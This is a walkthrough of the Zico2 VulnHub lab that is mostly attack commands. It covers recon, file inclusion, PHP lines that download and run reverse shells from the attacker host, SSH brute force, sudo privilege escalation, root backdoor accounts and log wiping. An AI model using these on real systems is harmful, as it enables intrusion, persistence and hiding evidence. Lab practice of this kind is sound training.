# Zico2 Writeup - Web Application Security
A method of learning how to find vulnerabilities in a system. Simulations on ethical hacking, how we as pentesters can enter into a system by utilizing vulnerabilities that exist on the victim's website, as well as making security by patching existing vulnerabilities.

## Tools
- dirbsearch
- Uniscan
- SearchSploit
- Netcat
- Metasploit Framework
- Weevely

## Templates
https://www.vulnhub.com/entry/zico2-1,210/

## Methodology & Technique
### Reconnaissance
#### Network Mapping
```
nmap -A -v -T5 -sS 192.168.1.1

-A = Enables OS detection and Version detection, Script scanning and Traceroute
-v = Increase verbosity level (use twice or more for greater effect)
-T5 = Set timing template (higher is faster)
-sS = TCP SYN/Connect()/ACK/Window/Maimon scans
```

#### Information Gathering/Footprinting
```
ping 192.168.1.1
telnet 192.168.1.1 80
telnet 192.168.1.1 22
nc 192.168.1.1 80
nc 192.168.1.1 22
curl -I 192.168.1.1

-I = Fetch the headers only!
```

### Reporting
#### Creating Reconnaissance Report
```
nmap -A -v -T5 -sS 192.168.1.1 -oN 192.168.1.1-top10TCP.nmap

--top-ports 10 = Scan 10 most common ports
--open = Only show open (or possibly open) ports
-Pn = Disabling host discovery
-n = Never do DNS resolution
-oN = Output scan in normal
```

### Scanning
#### Web Object Scanning
```
dirsearch -u http://192.168.1.1 -w /usr/share/dirb/wordlists/common.txt -e php

-u = URL
-w = Wordlists
-e = Extensions
```

#### Web Vulnerabilities Scanning
```
uniscan -u 192.168.1.1 -qweds

-u = URL
-q = Enable Directory checks
-w = Enable File checks
-e = Enable robots.txt and sitemap.xml check
-d = Enable Dynamic checks
-s = Enable Static checks
```

### Exploitation
#### Searching Exploit
```
searchsploit phpliteadmin
cat /opt/searchsploit/exploits/php/webapps/24044.txt
```

#### Google Dorking
```
inurl: phpliteadmin default password
```

#### Creating Meterpreter Shell
```
msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf -o shell
mv shell /usr/share/nginx/html/
chmod 777 shell
vim /usr/databases/meterpreter_reverse_tcp_shell.php
```
```
<?php system("cd /tmp; wget http://192.168.1.2/shell; chmod 777 shell; ./shell"); ?>
```

#### Creating Meterpreter Exploit
```
service postgresql start
msfconsole
```
```
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.2
set LPORT 443
exploit
```

#### Accessing Meterpreter Shell
```
http://192.168.1.1/view.php?page=../../usr/databases/meterpreter_reverse_tcp_shell.php
```

#### Accessing Pseudo-Terminal
```
shell
```
```
python -c 'import pty; pty.spawn("/bin/bash")'

-c = Command
pty = Pseudo-terminal utilities
pty.spawn = Module for controling pseudo-terminal
```

#### Creating Reverse Shell
```
cd /usr/share/nginx/html
vim shell.txt
```
```
<?php $sock=fsockopen("192.168.1.2",1234); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```
```
chmod 777 shell.txt
vim /usr/databases/php_system_reverse_shell.php
```
```
<?php system("wget http://192.168.1.2/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>
```

#### Accessing Reverse Shell
```
nc -lvp 1234 / netcat -lvp 1234

-l = Listen mode
-v = Prints status messages
-p = Listened port
```
```
http://192.168.1.1/view.php?page=../../usr/databases/php_system_reverse_shell.php
```
```
bash -i

-i = Shell is interactive
```

### Gaining Access
```
hydra -l root -P /opt/rockyou.txt ssh://192.168.1.1:22

-l = Username
-P = Password list
ssh = Protocol
22 = Default port service
```
```
cd /home/zico/wordpress
cat wp-config.php | grep DB_
```
```
define('DB_NAME', 'zico');
define('DB_USER', 'zico');
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
define('DB_HOST', 'zico');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
```
```
ssh zico@192.168.1.1
```

### Privilige Escalation
```
sudo -l
touch /tmp/privesc
sudo -u root zip /tmp/privesc.zip /tmp/privesc -T --unzip-command="sh -c /bin/bash"
sudo -u root tar cf /dev/null /tmp/privesc --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo -u root zip /tmp/privesc.zip /tmp/privesc -T --unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'"

-l = List
-u = User
-T = Test  the integrity of the new zip file
-i = Shell is interactive
```
```
bash -i
whoami
id root
```

### Backdooring
#### Creating Backdoored User Login
```
useradd -ou 0 -g 0 zombie
passwd zombie
id zombie

-o = --non-unique (Duplicate User)
-u = --uid (User ID) -> 0 (Root User) / 1000 (Sudo User)
-g = --gid (Group ID)
```

#### Creating PHP Backdoored
```
weevely generate b@cKd00r3d /usr/share/nginx/html/backdoored
chmod 777 /usr/share/nginx/html/backdoored
vim /usr/databases/post_exploitation_backdoored.php
```
```
<?php system("cd /tmp; wget http://192.168.1.2/backdoored; chmod 777 backdoored; mv backdoored backdoored.php"); ?>
```

#### Accessing PHP Backdoored
```
http://192.168.1.1/view.php?page=../../usr/databases/post_exploitation_backdoored.php
```
```
weevely http://192.168.1.1/view.php?page=../../tmp/backdoored.php b@cKd00r3d
```

### Covering Tracks
```
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/apache2/access.log
cat /dev/null > /var/log/apache2/error.log
cat /dev/null > ~/.bash_history && history -c

-c = Clear the history list
```

### Vulnerability Patching
#### Vulnerable Code
```
cd /var/www/dbadmin
cat view.php
```
```
<?php
       $page = $_GET['page'];
       include("/var/www/".$page);
?>
```

#### Patch Code
```
vim view.php-patch
```
```
<?php
       $page = filter_input(INPUT_GET, 'page', FILTER_SANITIZE_ENCODED);
       include("/var/www/".$page);
?>
```

## Notes
- This simulation is only intended for learning
- All actions that refer to criminal acts are beyond the responsibility of the author
- Happy hacking
